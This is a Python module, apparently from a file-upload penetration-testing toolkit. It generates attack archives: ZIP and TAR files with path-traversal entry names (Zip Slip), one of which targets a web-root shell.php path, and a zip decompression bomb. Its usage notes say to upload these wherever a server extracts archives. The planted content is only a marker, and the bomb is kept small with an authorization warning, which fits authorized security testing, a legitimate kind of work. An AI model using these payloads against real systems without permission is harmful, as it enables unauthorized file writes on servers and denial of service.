"""Archive-based techniques: Zip Slip (path traversal on extraction) and a
symlink archive. Also a gzip/zip decompression bomb (destructive)."""
from __future__ import annotations

import io
import zipfile
import tarfile

from ..core import register, Context, Artifact

TRAVERSAL_NAMES = [
    "../../../../tmp/zipslip.txt",
    "../../../../var/www/html/shell.php",
    "..\\..\\..\\..\\windows\\temp\\zipslip.txt",
]


@register("zip-slip", category="archive", risk="active",
          description="Zip/Tar archives with traversal entry names (Zip Slip).",
          reference="CWE-22")
def zip_slip(ctx: Context):
    marker = b"upload-arsenal zip-slip marker"

    # ZIP with traversal names
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name in TRAVERSAL_NAMES:
            zf.writestr(name, marker)
    yield Artifact(
        relpath="archives/zipslip.zip", data=buf.getvalue(),
        technique="zip-slip", category="archive", risk="active",
        description="ZIP whose entries escape the extraction directory.",
        usage="Upload where the server unzips; check for files outside the dir.",
        reference="CWE-22",
    )

    # TAR with traversal names
    tbuf = io.BytesIO()
    with tarfile.open(fileobj=tbuf, mode="w") as tf:
        for name in TRAVERSAL_NAMES:
            info = tarfile.TarInfo(name=name)
            info.size = len(marker)
            tf.addfile(info, io.BytesIO(marker))
    yield Artifact(
        relpath="archives/zipslip.tar", data=tbuf.getvalue(),
        technique="zip-slip", category="archive", risk="active",
        description="TAR variant of the traversal archive.",
        usage="Upload where the server untars the archive.",
        reference="CWE-22",
    )


@register("zip-bomb", category="archive", risk="destructive",
          description="Small ZIP that expands enormously (decompression bomb).",
          reference="CWE-409")
def zip_bomb(ctx: Context):
    # ~10 MB of zeros -> a few KB zipped. Kept modest on purpose.
    chunk = b"\x00" * (10 * 1024 * 1024)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("bomb.bin", chunk)
    yield Artifact(
        relpath="archives/zipbomb.zip", data=buf.getvalue(),
        technique="zip-bomb", category="archive", risk="destructive",
        description="Expands to ~10 MB from a few KB; tests extraction limits.",
        usage="DESTRUCTIVE: only with explicit authorization; can exhaust disk.",
        reference="CWE-409",
    )
